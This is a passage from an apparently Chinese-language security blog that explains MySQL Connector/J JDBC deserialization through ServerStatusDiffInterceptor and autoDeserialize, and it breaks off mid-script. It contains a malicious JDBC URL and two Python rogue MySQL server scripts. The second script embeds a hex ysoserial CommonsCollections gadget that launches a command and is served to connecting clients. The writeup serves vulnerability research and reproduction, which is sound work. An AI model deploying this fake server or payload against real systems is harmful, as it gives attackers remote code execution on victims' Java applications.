<p><a href="https://paper.seebug.org/942/">如何绕过高版本 JDK 的限制进行 JNDI 注入利用</a></p>
<p><a href="https://zjackky.github.io/post/java-security-remembrance-jdk8u191-jndi-bypasses-the-principle-2m8bwc.html">Java安全 - 记JDK8u191后JNDI绕过原理</a></p>
<p><a href="https://tttang.com/archive/1441">JAVA 协议安全笔记-JNDI篇</a></p>
<p><a href="https://www.bilibili.com/video/BV1P54y1Z7Lf/?spm_id_from=333.1387.upload.video_card.click&vd_source=d195054a6a081ba07486dcc86c6ba707">从文档开始的jndi注入之路-1</a></p>
<p><a href="https://www.bilibili.com/video/BV1JY411F7mA?spm_id_from=333.788.videopod.sections&vd_source=d195054a6a081ba07486dcc86c6ba707">从文档开始的jndi注入之路-2 jndi+ldap绕过</a></p>
<p><a href="https://www.bilibili.com/video/BV1ct4y1h79t?spm_id_from=333.788.videopod.sections&vd_source=d195054a6a081ba07486dcc86c6ba707">从文档开始的jndi注入之路-3 高版本绕过之三打jndi</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JDBC反序列化</title>
    <url>/2025/02/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>connector&#x2F;J 5、6、8个版本触发反序列化的方式略有区别，文中所使用的JDBC驱动版本为8.0.12，为了验证漏洞还有CC的依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>



<h2 id="JDBC简介"><a href="#JDBC简介" class="headerlink" title="JDBC简介"></a>JDBC简介</h2><p>JDBC（Java DataBase Connectivity）是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了 <code>DriverManager</code>、<code>Connection</code>、<code>Statement</code>、<code>ResultSet</code> 等 API，你可以在jre\lib\rt.jar!\java\sql看到这些内容。</p>
<h2 id="MySQL-Connector-J"><a href="#MySQL-Connector-J" class="headerlink" title="MySQL Connector&#x2F;J"></a>MySQL Connector&#x2F;J</h2><p><strong>Connector&#x2F;J</strong> 是 MySQL 提供的 JDBC 驱动，它实现了 JDBC 接口，还封装了 MySQL 客户端与服务器之间的<a href="https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_PROTOCOL.html">通信协议(Client&#x2F;Server Protocol)</a>允许 Java 程序通过 JDBC 与 MySQL 数据库进行通信。</p>
<h3 id="连接语法"><a href="#连接语法" class="headerlink" title="连接语法"></a>连接语法</h3><p>在<a href="https://mysql.net.cn/doc/connector-j/en/connector-j-reference-jdbc-url-format.html">6.2 连接 URL 语法_MySQL 连接器&#x2F;J 8.0 开发人员指南</a>中我们可以详细的看到连接MySQL 的 URL 的通用格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">protocol//[hosts][/database][?properties]<br></code></pre></td></tr></table></figure>

<p>我们可以通过key&#x3D;value的格式来设置属性</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250213112648633.png" alt="image-20250213112648633"></p>
<h3 id="连接参数"><a href="#连接参数" class="headerlink" title="连接参数"></a>连接参数</h3><p>我们常看到的反序列化payload的是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;jdbc:mysql://地址:IP/test?&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>通常会使用的这些语句属性，可以在<a href="https://mysql.net.cn/doc/connector-j/en/connector-j-reference-configuration-properties.html">6.3 配置属性_MySQL 连接器&#x2F;J 8.0 开发人员指南</a>找到。</p>
<ul>
<li>tatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。在 8.0 中被queryInterceptors参数替代。</li>
<li>queryInterceptors:实现“com.mysql.cj.interceptors.QueryInterceptor”的类的逗号分隔列表，拦截查询执行并能够影响结果。（效果上来看是在Query执行前后各插入一次操作）</li>
<li>autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。</li>
<li>detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集&#x2F;排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集&#x2F;排序规则。这可能会显着减慢连接初始化速度。</li>
</ul>
<h2 id="JAVA序列化对象特征"><a href="#JAVA序列化对象特征" class="headerlink" title="JAVA序列化对象特征"></a>JAVA序列化对象特征</h2><p>生成一个序列化文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Car</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name =<span class="hljs-string">&quot;car&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Car car=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>();<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;output&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(car);<br>        oos.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到我们序列化后的对象前两个字节分别是<code>-84</code>和<code>-19</code> ，个是java对象的一个标识，后面会用到这两个数字，记住就好了。</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250213134155903.png" alt="image-20250213134155903"></p>
<h1 id="ServerStatusDiffInterceptor触发方式"><a href="#ServerStatusDiffInterceptor触发方式" class="headerlink" title="ServerStatusDiffInterceptor触发方式"></a>ServerStatusDiffInterceptor触发方式</h1><p>反序列化漏洞，那就需要可以解析我们传过来的恶意对象，作者找到了ResultSetImpl#getObject ，<strong>这个case中会判断autoDeserialize是否为ture(我第一个断点的地方)<strong>，</strong>第一个和第二字节是不是为-84和-19(其实就是判断是不是为序列化的字符串)<strong>，最终执行反序列化。</strong>这也就是为什么payload中有&amp;autoDeserialize&#x3D;true的原因。</strong></p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250213191319950.png" alt="image-20250213191319950"></p>
<p>接着找谁调用了getObject，找到了com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap(java.util.Map, java.sql.ResultSet)，这里多提一嘴为什么这里这么多类调用了getObjct方法，只选择了ResultSetUtil#resultSetToMap()</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250214110457671.png" alt="image-20250214110457671"></p>
<p>其实可以仔细看看别的类调用的getObjct是不可控的。好，重点我们放在ResultSetUtil#resultSetToMap()。</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250213193519541.png" alt="image-20250213193519541"></p>
<p>其实这里只有第二个参数才能触发反序列化，让我们再点进getObject方法，我们发现如果columnIndex&#x3D;1，直接就return了。</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250213183825895.png" alt="image-20250213183825895"></p>
<p>接着找谁调用了resultSetToMap()方法，最终是找到了com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor这个类其中populateMapWithSessionStatusValues方法调用了resultSetToMap方法，它会对参数调用getObject方法。同时可以观察到这个类实现了QueryInterceptor接口。</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250214110917840.png" alt="image-20250214110917840"></p>
<p>所以我们现在是想要触发ServerStatusDiffInterceptor类，</p>
<p>记得我们上面提到的queryInterceptors语句属性么?他能拦截查询执行并能够影响结果。它需要触发SQL Query，而在getConnection过程中，会触发<code>SET NAMES utf</code>、<code>set autocommit=1</code>一类的语句，所以会触发我们所配置的queryInterceptors。</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250214124959116.png" alt="image-20250214124959116"></p>
<p>综上就是payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true<br></code></pre></td></tr></table></figure>

<p>的来源</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>以上是把链找全了，我们继续把关注点放到<code>ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</code>上面</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250214182451374.png" alt="image-20250214182451374"></p>
<p>关键部分就是<code>rs</code>变量的构造，简单对整个代码进行分析，最后调用了<code>rs.getObject</code>方法，而在这个方法里面，<code>data</code>变量的值为执行查询语句后返回的表的第一列值（根据<code>columnIndex</code>）。</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250215142029870.png" alt="image-20250215142029870"></p>
<p>我们对上述代码进行调试，当执行完<code>show session status</code>之后，如果可以执行<code>byte[] data = getBytes(columnIndex);</code>的话，那么<code>data</code>变量的值为：</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250215142357463.png" alt="image-20250215142357463"></p>
<p>使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?useSSL=false&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;serverTimezone=UTC</span><br></code></pre></td></tr></table></figure>

<p>来抓包这里设置<code>useSSL=false</code>主要是为了方便抓取<code>mysql</code>数据包进行分析。</p>
<p>定位到SHOW SESSION STATUS的位置</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250215143039970.png" alt="image-20250215143039970"></p>
<p>我们追踪流，蓝色的部分为服务器发出的报文，SHOW SESSION STATUS前面的服务器报文我们可以直接无脑复制</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250215143432331.png" alt="image-20250215143432331"></p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-type">GreetingInfo</span>=<span class="hljs-string">&quot;4a0000000a382e302e313200110000004c4d1f1f583b207b00ffffc00200ffc31500000000000000000000783210720f33592f04355201006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><br><span class="hljs-title">resOk</span>=<span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><span class="hljs-title">loginValid</span>=<span class="hljs-string">&quot;01000001112e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000e036465660000000873716c5f6d6f6465000c21005f010000fd00001f00002600000f036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000010036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001103646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000012036465660000000c776169745f74696d656f7574000c3f001500000008a000000000e9000013013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce40653595354454d0f52455045415441424c452d524541440331323007000014fe000002000000&quot;</span><br><br><span class="hljs-title">resCharset</span>=<span class="hljs-string">&quot;0700000100000002000000&quot;</span><br><br><span class="hljs-title">resAutoco</span>=<span class="hljs-string">&quot;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000&quot;</span><br><br><span class="hljs-title">def</span> startServer():<br>    serverSocket = socket.socket(socket.<span class="hljs-type">AF_INET</span>, socket.<span class="hljs-type">SOCK_STREAM</span>)<br>    serverSocket.setsockopt(socket.<span class="hljs-type">SOL_SOCKET</span>, socket.<span class="hljs-type">SO_REUSEADDR</span>, <span class="hljs-number">1</span>)<br>    serverSocket.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">3309</span>))<br>    serverSocket.listen(<span class="hljs-number">1</span>)<br>    print(<span class="hljs-string">&quot;Start Fake Server:&#123;&#125;:&#123;&#125;&quot;</span>.format(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-string">&quot;3309&quot;</span>))<br>    while <span class="hljs-type">True</span>:<br>        conn, addr = serverSocket.accept()<br>        conn.send(binascii.a2b_hex(<span class="hljs-type">GreetingInfo</span>))<br>        while <span class="hljs-type">True</span>:<br>            <span class="hljs-class"><span class="hljs-keyword">data</span> = conn.recv(1024)</span><br>            print(<span class="hljs-string">&quot;接收到数据：&#123;&#125;&quot;</span>.format(<span class="hljs-class"><span class="hljs-keyword">data</span>))</span><br>            <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;mysql_native_password&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-class"><span class="hljs-keyword">data</span>:</span><br>                conn.send(binascii.a2b_hex(<span class="hljs-type">ResOk</span>))<br>            elif b<span class="hljs-string">&quot;auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-class"><span class="hljs-keyword">data</span>:</span><br>                conn.send(binascii.a2b_hex(loginValid))<br>            elif b<span class="hljs-string">&quot;character_set_results&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-class"><span class="hljs-keyword">data</span>:</span><br>                conn.send(binascii.a2b_hex(resCharset))<br>            elif b<span class="hljs-string">&quot;session.autocommit&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-class"><span class="hljs-keyword">data</span>:</span><br>                conn.send(binascii.a2b_hex(resAutoco))<br><br><br><br><br><span class="hljs-title">if</span> __name__ == &#x27;__main__&#x27;:<br>    startServer()<br></code></pre></td></tr></table></figure>

<p>使用客户端连接，我们可以在这个小脚本看到结果</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250215144405302.png" alt="image-20250215144405302"></p>
<p>当然重点是SHOW SESSION STATUS的返回包的构造，这个包的数据很多，分为了四种不同的字段</p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250216005903901.png" alt="image-20250216005903901"></p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250216005917302.png" alt="image-20250216005917302"></p>
<p>这里我在官方文档找了好久都没没找到具体的说明，只找到了BLOB数据的值。我看的文章<a href="https://xz.aliyun.com/news/7754#toc-0">小白看得懂的MySQL JDBC 反序列化漏洞分析</a>和<a href="https://mp.weixin.qq.com/s/End_5mpLd1HoT7CtU3Pa2A">JDBC 反序列化漏洞分析 &amp; POC 编写</a></p>
<p><img src="https://image.sp4rks.xyz/2025/02/image-20250215204639356.png" alt="image-20250215204639356"></p>
<p>直接抄师傅的POC了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br>greeting_data = <span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br>response_ok_data = <span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">conn</span>):<br>    data = conn.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">conn, data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    conn.send(binascii.a2b_hex(data))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload_content</span>():<br>    <span class="hljs-comment"># file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a</span><br>    file = <span class="hljs-string">r&#x27;a&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            payload_content = <span class="hljs-built_in">str</span>(binascii.b2a_hex(f.read()), encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open successs&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open false&quot;</span>)<br>        <span class="hljs-comment"># calc</span><br>        payload_content = <span class="hljs-string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br>    <span class="hljs-keyword">return</span> payload_content<br><br><br><span class="hljs-comment"># 主要逻辑</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        conn, addr = sk.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>], addr[<span class="hljs-number">1</span>]))<br><br>        <span class="hljs-comment"># 1.先发送第一个 问候报文</span><br>        send_data(conn, greeting_data)<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span><br>            receive_data(conn)<br>            send_data(conn, response_ok_data)<br><br>            <span class="hljs-comment"># 其他过程</span><br>            data = receive_data(conn)<br>            <span class="hljs-comment"># 查询一些配置信息,其中会发送自己的 版本号</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                mysql_data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                <span class="hljs-comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span><br>                <span class="hljs-comment"># 获取payload</span><br>                payload_content = get_payload_content()<br>                <span class="hljs-comment">#计算payload长度</span><br>                payload_length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content) // <span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                <span class="hljs-comment">#计算数据包长度</span><br>                data_len = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content) // <span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                mysql_data += data_len_hex + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;fbfc&#x27;</span> + payload_length_hex<br>                mysql_data += <span class="hljs-built_in">str</span>(payload_content)<br>                mysql_data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                payload = <span 